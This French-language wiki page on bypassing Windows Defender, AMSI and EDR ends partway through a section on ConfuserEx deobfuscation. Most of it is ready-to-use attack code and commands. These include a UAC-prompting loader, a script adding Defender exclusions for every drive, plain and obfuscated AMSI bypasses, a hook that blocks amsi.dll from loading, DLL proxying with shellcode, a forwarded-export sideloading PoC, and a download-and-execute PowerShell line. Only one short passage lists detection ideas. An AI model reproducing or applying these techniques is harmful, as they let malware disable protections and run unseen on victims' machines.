# Contournement de l’antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement rédigée par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : un outil pour empêcher Windows Defender de fonctionner en simulant un autre antivirus.
- [Désactiver Defender si vous êtes administrateur](basic-powershell-for-pentesters/README.md)

### Piège UAC de type installateur avant de saboter Defender

Les loaders publics se faisant passer pour des cheats de jeu sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés qui **demandent d’abord à l’utilisateur une élévation de privilèges**, puis neutralisent Defender. Le déroulement est simple :

1. Vérifier si le contexte est administratif avec `net session`. Cette commande ne réussit que si l’utilisateur dispose des droits d’administrateur ; en cas d’échec, le loader s’exécute donc en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` afin de déclencher l’invite de consentement UAC attendue tout en conservant la ligne de commande d’origine.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Les victimes pensent déjà installer un logiciel « cracké » ; elles acceptent donc généralement l’invite, ce qui donne au malware les droits nécessaires pour modifier la stratégie de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` générales pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader tue d’abord le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible échappe à l’analyse :

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observations clés :

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.) ; **toute charge utile déposée ultérieurement n’importe où sur le disque est donc ignorée**.
- L’exclusion de l’extension `.sys` est préventive : les attaquants se réservent la possibilité de charger plus tard des drivers non signés sans avoir à toucher de nouveau à Defender.
- Toutes les modifications sont enregistrées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes suivantes de vérifier que les exclusions persistent ou de les étendre sans redéclencher l’UAC.

Comme aucun service Defender n’est arrêté, les contrôles de santé naïfs continuent d’indiquer que « l’antivirus est actif », même si l’inspection en temps réel ne surveille jamais ces chemins.<sup>[[26]](#references)</sup>

## **Méthodologie d’évasion AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : la détection statique, l’analyse dynamique et, pour les EDR plus avancés, l’analyse comportementale.

### **Détection statique**

La détection statique consiste à repérer des chaînes ou des tableaux d’octets malveillants connus dans un binaire ou un script, ainsi qu’à extraire des informations du fichier lui-même (par exemple, sa description, le nom de l’entreprise, les signatures numériques, l’icône, la somme de contrôle, etc.). Ainsi, l’utilisation d’outils publics connus risque davantage de vous faire repérer, car ils ont probablement déjà été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais vous aurez besoin d’un loader pour le déchiffrer et l’exécuter en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou votre script pour le faire passer au travers de l’AV, mais cette tâche peut prendre du temps selon ce que vous essayez d’obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, aucune signature malveillante connue ne leur sera associée, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Une bonne façon de vérifier la détection statique de Windows Defender est d’utiliser [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise le fichier en plusieurs segments, puis demande à Defender d’analyser chacun d’eux individuellement. Il peut ainsi vous indiquer précisément quelles chaînes ou quels octets de votre binaire ont été signalés.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l’évasion AV en pratique.

### Tests hors ligne des caractéristiques PE pour les classificateurs statiques

Les octets d’une charge utile compressée ou chiffrée ne constituent qu’une des entrées d’un classificateur statique. EMBER2024 extrait des caractéristiques PE, notamment les imports, les exports, les sections, les en-têtes et les données Authenticode.<sup>[[48]](#references)</sup> Lors d’une expérience sur un loader, l’ajout de 141 imports d’apparence légitime a réduit de 93 % le score de malveillance dans EMBER2024, tandis que les imports associés aux malwares l’ont augmenté. Ce résultat concerne ce modèle et ces échantillons ; il ne constitue pas un moyen fiable de contourner un produit AV/EDR particulier.<sup>[[50]](#references)</sup>

Pour tester un loader dans un cadre autorisé, gardez la charge utile et le chemin d’exécution constants, ne modifiez qu’une seule variable de build prévue par variante et comparez les scores hors ligne. Examinez les caractéristiques PE obtenues, car une modification du build peut affecter plusieurs groupes de caractéristiques.<sup>[[49]](#references)[[50]](#references)</sup> Pour conserver les imports prévus dans l’IAT, appelez les API Win32 choisies depuis du code accessible. Faites varier la sélection et répartissez les points d’appel entre les builds au lieu de créer une fonction de camouflage fixe qui pourrait devenir une signature. L’expérience a également rapporté des scores plus faibles avec une signature de code valide, des entrées d’export et davantage de fonctions augmentant la taille de `.pdata` ; une signature invalide a eu peu d’effet, et l’effet de `.pdata` était faible.<sup>[[50]](#references)</sup>

Le package `thrember` fournit l’extraction de caractéristiques et des modèles de référence. Après l’installation, utilisez `thrember.download_models("models")` avec un répertoire `models` existant, puis lancez le scorer depuis son répertoire parent : l’utilitaire de téléchargement modifie le répertoire de travail courant. Le classificateur PE peut évaluer un répertoire de builds sans les envoyer à un service d’analyse :<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Gardez le modèle et les versions de l’extracteur de caractéristiques fixes pendant la comparaison. Un score hors ligne plus faible montre seulement comment ce classificateur réagit au binaire modifié ; cela ne prouve pas l’évasion de l’analyse comportementale, de l’émulation ou du modèle différent d’un fournisseur.<sup>[[49]](#references)[[50]](#references)</sup> Pour le [polymorphisme par build et le camouflage du binaire externe dans les payloads virtualisés](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consultez le modèle d’exécution distinct.

### **Analyse dynamique**

L’analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller les activités malveillantes (par exemple, tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques méthodes pour échapper aux sandbox.

- **Attendre avant l’exécution** Selon la façon dont c’est implémenté, cela peut être un excellent moyen de contourner l’analyse dynamique de l’AV. Les AV disposent de très peu de temps pour analyser les fichiers afin de ne pas interrompre le travail de l’utilisateur ; de longues pauses peuvent donc perturber l’analyse des binaires. Le problème, c’est que de nombreux sandbox d’AV peuvent simplement ignorer la pause, selon la façon dont elle est implémentée.
- **Vérifier les ressources de la machine** Les sandbox disposent généralement de très peu de ressources (par ex. < 2GB de RAM), sinon elles pourraient ralentir la machine de l’utilisateur. Vous pouvez aussi faire preuve de créativité : par exemple, vérifier la température du CPU ou même la vitesse des ventilateurs. Tout ne sera pas implémenté dans le sandbox.
- **Vérifications propres à la machine** Si vous voulez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l’ordinateur pour voir s’il correspond à celui que vous avez spécifié. Si ce n’est pas le cas, vous pouvez faire quitter votre programme.

Il s’avère que le nom de l’ordinateur du sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l’ordinateur dans votre malware avant son exécution : s’il correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici d’autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour déjouer les sandbox :

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Comme nous l’avons déjà dit dans cet article, les **outils publics** finissent par **être détectés**. Posez-vous donc la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet, moins connu, qui dumpe aussi LSASS ?

La deuxième option est probablement la bonne. Prenons mimikatz comme exemple : c’est probablement l’un des malwares les plus signalés par les AV et les EDR, si ce n’est le plus signalé. Le projet lui-même est très intéressant, mais il est aussi extrêmement difficile à utiliser pour contourner les AV. Cherchez donc simplement des alternatives pour atteindre votre objectif.

> [!TIP]
> Lorsque vous modifiez vos payloads pour échapper à la détection, veillez à **désactiver l’envoi automatique d’échantillons** dans Defender et, s’il vous plaît, **NE TÉLÉVERSEZ PAS SUR VIRUSTOTAL** si votre objectif est d’échapper à la détection sur le long terme. Si vous voulez vérifier si un AV particulier détecte votre payload, installez-le sur une VM, essayez de désactiver l’envoi automatique d’échantillons et faites vos tests jusqu’à ce que le résultat vous convienne.

## EXEs vs DLLs

Dans la mesure du possible, **privilégiez toujours les DLL pour l’évasion**. D’après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés et analysés**. C’est donc une astuce très simple pour éviter la détection dans certains cas (si votre payload peut être exécuté en tant que DLL, bien sûr).

Comme on peut le voir sur cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Comparaison sur antiscan.me d’un payload EXE Havoc standard avec une DLL Havoc standard</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces que vous pouvez utiliser avec les fichiers DLL pour être beaucoup plus discret.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant l’application victime et le ou les payloads malveillants côte à côte.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading avec [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Cette commande affichera la liste des programmes susceptibles au DLL hijacking dans « C:\Program Files\\ » et des fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes vulnérables au DLL Hijack/Sideload**, cette technique est assez furtive si elle est bien exécutée, mais si vous utilisez des programmes DLL Sideloadable connus du public, vous risquez de vous faire repérer facilement.

Le simple fait de placer une DLL malveillante portant le nom d’une DLL qu’un programme s’attend à charger ne chargera pas votre payload, car le programme s’attend à trouver certaines fonctions dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige vers la DLL d’origine les appels qu’un programme effectue depuis la DLL proxy (et malveillante), préservant ainsi les fonctionnalités du programme tout en permettant l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j’ai suivies :

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

La dernière commande nous fournira 2 fichiers : un modèle de code source DLL et la DLL d'origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J’appellerais ça une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que [la vidéo d’ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour en apprendre davantage sur ce dont nous avons parlé.

### Abusing Forwarded Exports (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en fait des « forwarders » : au lieu de pointer vers du code, l’entrée d’export contient une chaîne ASCII au format `TargetDll.TargetFunc`. Lorsqu’un appelant résout l’export, le chargeur Windows va :

- Charger `TargetDll` si elle n’est pas déjà chargée
- Résoudre `TargetFunc` à partir de celle-ci

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, elle est fournie depuis l’espace de noms protégé KnownDLLs (par ex. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n’est pas une KnownDLL, l’ordre de recherche normal des DLL est utilisé, y compris le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction forwardée vers un nom de module qui n’est pas une KnownDLL, puis placer cette DLL signée à côté d’une DLL contrôlée par l’attaquant portant exactement le nom du module cible forwardé. Lorsque l’export forwardé est appelé, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant ainsi votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sur Windows 11 :

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` n’est pas une KnownDLL ; elle est donc résolue selon l’ordre de recherche normal.

PoC (copier-coller) :
1) Copiez la DLL système signée dans un dossier accessible en écriture.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un `DllMain` minimal suffit pour exécuter du code ; vous n’avez pas besoin d’implémenter la fonction redirigée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Déclenchez le forward avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n’est pas implémenté, vous obtiendrez une erreur « missing API » seulement après l’exécution de `DllMain`

Conseils de recherche :
- Concentrez-vous sur les exports forwardés dont le module cible n’est pas un KnownDLL. Les KnownDLLs sont répertoriés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection et de défense :
- Surveillez les LOLBins (par exemple, rundll32.exe) qui chargent des DLL signées depuis des chemins non système, puis chargent des DLL qui ne sont pas des KnownDLLs et qui portent le même nom de base depuis ce répertoire
- Déclenchez une alerte sur les chaînes de processus/modules telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l’utilisateur
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez les permissions d’écriture et d’exécution dans les répertoires d’applications

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un toolkit de payload pour contourner les EDR à l’aide de processus suspendus, de syscalls directs et de méthodes d’exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd’hui peut être détecté demain. Ne vous fiez donc jamais à un seul outil ; si possible, essayez d’enchaîner plusieurs techniques d’évasion.

## Syscalls directs/indirects et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **hooks inline en mode utilisateur** sur les stubs de syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et passent en mode noyau sans exécuter le point d’entrée exporté intercepté par un hook.<sup>[[32]](#references)</sup>

**Options d’invocation :**
- **Direct (embedded)** : émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à un export de `ntdll`).
- **Indirect** : sauter vers un gadget `syscall` existant dans `ntdll` afin que la transition vers le noyau semble provenir de `ntdll` (utile pour l’évasion heuristique) ; **randomized indirect** sélectionne un gadget dans un pool à chaque appel.
- **Egg-hunt** : éviter d’intégrer sur le disque la séquence d’opcodes statique `0F 05` ; résoudre une séquence de syscall à l’exécution.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (VA sort)** : déduire les SSN en triant les stubs de syscall par adresse virtuelle plutôt qu’en lisant les octets des stubs.
- **SyscallsFromDisk** : mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN dans son `.text`, puis le démapper (contourne tous les hooks en mémoire).
- **RecycledGate** : combiner la déduction des SSN par tri des adresses virtuelles avec la validation des opcodes lorsque le stub est propre ; revenir à la déduction par adresse virtuelle si un hook est détecté.
- **HW Breakpoint** : placer DR0 sur l’instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l’exécution, sans analyser les octets interceptés par un hook.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les « [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware) ». Au départ, les antivirus ne pouvaient analyser que les **fichiers sur le disque**. Ainsi, si vous pouviez exécuter des payloads **directement en mémoire**, l’antivirus ne pouvait rien faire pour l’en empêcher, car il n’avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée aux composants Windows suivants.

- Contrôle de compte d’utilisateur, ou UAC (élévation d’EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros Office VBA

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme non chiffrée et non obfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` déclenchera l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu’il ajoute `amsi:` suivi du chemin de l’exécutable à l’origine de l’exécution du script, dans ce cas, powershell.exe.

Nous n’avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire à cause d’AMSI.

De plus, depuis **.NET 4.8**, le code C# est également analysé par AMSI. Cela concerne même `Assembly.Load(byte[])`, utilisé pour charger du code en mémoire. C’est pourquoi il est recommandé d’utiliser des versions antérieures de .NET (comme 4.7.2 ou une version inférieure) pour l’exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut donc être un bon moyen d’échapper à la détection.

Cependant, AMSI peut désobfusquer les scripts, même s’ils comportent plusieurs couches. L’obfuscation peut donc être une mauvaise option, selon la manière dont elle est réalisée. Le contournement n’est ainsi pas si simple. Toutefois, il suffit parfois de modifier quelques noms de variables pour s’en sortir : tout dépend du degré de détection de l’élément concerné.

- **AMSI Bypass**

AMSI étant implémenté par le chargement d’une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement, même avec un utilisateur non privilégié. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont découvert plusieurs moyens d’échapper à l’analyse d’AMSI.

**Forcing an Error**

Forcer l’échec de l’initialisation d’AMSI (amsiInitFailed) empêchera toute analyse dans le processus actuel. Cette technique a été initialement révélée par [Matt Graeber](https://twitter.com/mattifestation), et Microsoft a développé une signature pour empêcher son utilisation à grande échelle.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Il n'a fallu qu'une seule ligne de code PowerShell pour rendre AMSI inutilisable pour le processus PowerShell en cours. Cette ligne a bien sûr été détectée par AMSI lui-même ; une modification est donc nécessaire pour utiliser cette technique.

Voici un contournement d'AMSI modifié que j'ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Gardez à l’esprit que cette publication sera probablement signalée une fois publiée. Vous ne devriez donc publier aucun code si votre objectif est de rester indétectable.

**Memory Patching**

Cette technique, découverte à l’origine par [@RastaMouse](https://twitter.com/_RastaMouse/), consiste à trouver l’adresse de la fonction « AmsiScanBuffer » dans amsi.dll (chargée d’analyser les entrées fournies par l’utilisateur) et à la remplacer par des instructions qui renvoient le code E_INVALIDARG. Ainsi, le résultat de l’analyse proprement dite sera 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez consulter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques permettant de contourner AMSI avec PowerShell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI est initialisé uniquement après le chargement de `amsi.dll` dans le processus actuel. Une méthode de contournement robuste et indépendante du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll`, qui renvoie une erreur lorsque le module demandé est `amsi.dll`. Ainsi, AMSI n’est jamais chargé et aucune analyse n’a lieu pour ce processus.<sup>[[23]](#references)</sup>

Présentation de l’implémentation (pseudocode C/C++ x64) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À associer à l’envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les longues traces en ligne de commande.
- Cette technique a été observée dans des loaders exécutés via des LOLBins (p. ex., `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également un script pour contourner AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également un script pour contourner AMSI et éviter les signatures en utilisant une fonction définie par l’utilisateur et randomisée, des variables, des expressions de caractères, ainsi qu’une casse aléatoire pour les mots-clés PowerShell.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus actuel. Cet outil analyse la mémoire du processus actuel à la recherche de la signature AMSI, puis la remplace par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser la version 2 de PowerShell**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment procéder :

```bash
powershell.exe -version 2
```

## Journalisation PS

La journalisation PowerShell est une fonctionnalité qui permet d’enregistrer toutes les commandes PowerShell exécutées sur un système. Elle peut être utile à des fins d’audit et de dépannage, mais elle peut aussi poser **problème aux attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver la transcription PowerShell et la journalisation des modules** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser la version 2 de PowerShell** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, ce qui vous permettra d’exécuter vos scripts sans qu’ils soient analysés par AMSI. Pour cela, exécutez : `powershell.exe -version 2`
- **Utiliser une session PowerShell non managée** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l’approche utilisée par `powerpick` de Cobalt Strike). Cela permet d’échapper aux contrôles spécifiquement liés au processus `powershell.exe`, mais ne désactive pas intrinsèquement AMSI, la journalisation des blocs de script ni toutes les autres protections PowerShell ; la couverture dépend du runtime et de l’implémentation de l’hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmente l’entropie du binaire et facilite sa détection par les AV et les EDR. Soyez prudent et envisagez de ne chiffrer que certaines parties sensibles de votre code ou qui doivent être masquées.

### Désobfuscation de binaires .NET protégés par ConfuserEx

Lors de l’analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le flux de travail ci-dessous **restaure de manière fiable un IL presque original**, qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de l’anti-altération – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE, de sorte que toute modification provoque un plantage du binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
